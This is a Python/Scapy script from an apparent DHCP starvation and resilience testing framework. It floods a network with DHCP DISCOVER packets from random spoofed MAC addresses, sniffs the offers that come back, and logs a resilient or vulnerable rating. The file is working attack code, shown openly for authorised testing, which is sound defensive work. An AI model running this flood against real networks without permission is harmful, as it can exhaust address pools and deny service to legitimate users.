######################################################################################################################################################################################################################
# Part of the framework for DHCP resilience/starvation testing. By 41ph4-01, and our community. Note: Be mindful of the scope of work, & rules of engagement.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

from scapy.all import *
import random
import time
import json
from datetime import datetime

def generate_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))

def mac2bytes(mac):
    return bytes(int(x, 16) for x in mac.split(':'))

def send_discover(mac, xid):
    ether = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
    ip = IP(src="0.0.0.0", dst="255.255.255.255")
    udp = UDP(sport=68, dport=67)
    bootp = BOOTP(op=1, chaddr=mac2bytes(mac) + b'\x00'*10, xid=xid, flags=0x8000)
    dhcp = DHCP(options=[("message-type", "discover"), "end"])
    return ether / ip / udp / bootp / dhcp

def send_request(mac, xid, offered_ip, server_ip):
    ether = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
    ip = IP(src="0.0.0.0", dst="255.255.255.255")
    udp = UDP(sport=68, dport=67)
    bootp = BOOTP(op=1, chaddr=mac2bytes(mac) + b'\x00'*10, xid=xid, flags=0x8000)
    dhcp = DHCP(options=[("message-type", "request"),
                         ("requested_addr", offered_ip),
                         ("server_id", server_ip),
                         "end"])
    return ether / ip / udp / bootp / dhcp

def run_test(interface, count, mode):
    print(f"[+] Running {mode} test on {interface} with {count} packets")
    log = {
        "timestamp": str(datetime.now()),
        "interface": interface,
        "mode": mode,
        "macs": [],
        "offers": [],
        "response_times": [],
        "summary": {}
    }

    offers = []

    def handle(pkt):
        if DHCP in pkt:
            for opt in pkt[DHCP].options:
                if isinstance(opt, tuple) and opt[0] == 'message-type' and opt[1] == 2:
                    offers.append({
                        "mac": pkt.src,
                        "ip": pkt[BOOTP].yiaddr,
                        "server": pkt[IP].src,
                        "time": time.time()
                    })

    sniffer = AsyncSniffer(iface=interface, filter="udp and (port 67 or 68)", prn=handle)
    sniffer.start()
    time.sleep(1)

    start = time.time()
    for _ in range(count):
        mac = generate_mac()
        xid = random.randint(1, 0xFFFFFF)
        log["macs"].append(mac)
        pkt = send_discover(mac, xid)
        sendp(pkt, iface=interface, verbose=False)
        time.sleep(0.05)

    time.sleep(5)
    sniffer.stop()
    end = time.time()

    for offer in offers:
        offer["delay"] = offer["time"] - start
        log["offers"].append(offer)
        log["response_times"].append(offer["delay"])

    received = len(offers)
    ratio = received / count
    log["summary"] = {
        "sent": count,
        "received": received,
        "ratio": ratio,
        "resilience": "Resilient" if ratio >= 0.8 else "Vulnerable" if ratio < 0.2 else "Partially Resilient",
        "duration_sec": end - start
    }

    # Save log
    filename = f"logs/test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(os.path.join("dhcp_resilience_tester", filename), "w") as f:
        json.dump(log, f, indent=2)

    print(f"[+] Test complete. {received}/{count} responses received.")
    print(f"[+] Result: {log['summary']['resilience']}")
    return log

